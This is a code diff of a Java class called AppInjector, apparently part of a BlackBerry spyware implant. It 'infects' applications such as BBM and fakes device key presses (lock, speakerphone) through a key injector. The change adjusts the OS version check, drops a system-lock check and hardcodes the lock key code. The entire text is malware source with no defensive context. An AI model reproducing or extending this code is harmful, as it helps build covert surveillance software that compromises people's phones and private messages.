@@ -33,6 +33,7 @@ public class AppInjector {
     private AppInjectorInterface delegate;
 
     ApplicationManager manager = ApplicationManager.getApplicationManager();
+    public static final int KEY_LOCK = 4099;
 
     public AppInjector(int app) throws Exception {
         if (app == APP_BBM) {
@@ -123,17 +124,11 @@ public class AppInjector {
         //#ifdef DEBUG
         debug.trace("infect getHardwareLayout: " + Keypad.getHardwareLayout());
         //#endif
-        if (Device.getInstance().atLeast(4, 7)) {
+        
+        if (Device.getInstance().atLeast(5, 0)) {
             //#ifdef DEBUG
-            debug.trace("infect media " + Keypad.hasMediaKeys());
-            debug.trace("infect mute " + Keypad.hasMuteKey());
+            debug.trace("infect media " + Keypad.hasMediaKeys());          
             //#endif
-            boolean locked = ApplicationManager.getApplicationManager()
-                    .isSystemLocked();
-            //#ifdef DEBUG
-            debug.trace("locked " + locked);
-            //#endif
-
             if (Keypad.hasMediaKeys()) {
                 //#ifdef DEBUG
                 debug.trace("infect: KEY_SPEAKERPHONE");
@@ -145,7 +140,7 @@ public class AppInjector {
                 debug.trace("infect: KEY_LOCK");
                 //#endif
                 // con 9700 :
-                KeyInjector.pressRawKeyCode(Keypad.KEY_LOCK);
+                KeyInjector.pressRawKeyCode(KEY_LOCK);
             }
 
         } else {
